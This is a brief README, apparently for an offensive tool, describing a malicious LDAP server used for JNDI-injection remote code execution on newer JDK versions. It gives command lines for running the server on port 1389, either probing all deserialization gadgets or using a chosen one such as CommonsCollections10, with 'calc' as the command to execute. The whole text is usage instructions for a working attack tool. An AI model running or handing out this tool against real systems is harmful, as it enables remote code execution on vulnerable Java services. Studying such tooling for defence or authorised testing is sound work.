# ldapserver
```
evil ldapserver while jndi injection rce with higher jdk ,such as jdk8u191
```
# how to use 
```
全量gadget:  (可用于探测支持的gadget)
java -jar ldapserver.jar -c "calc" -p 1389
指定gadget: (用于执行) 
java -jar ldapserver.jar -c "calc" -p 1389 -g CommonsCollections10

```
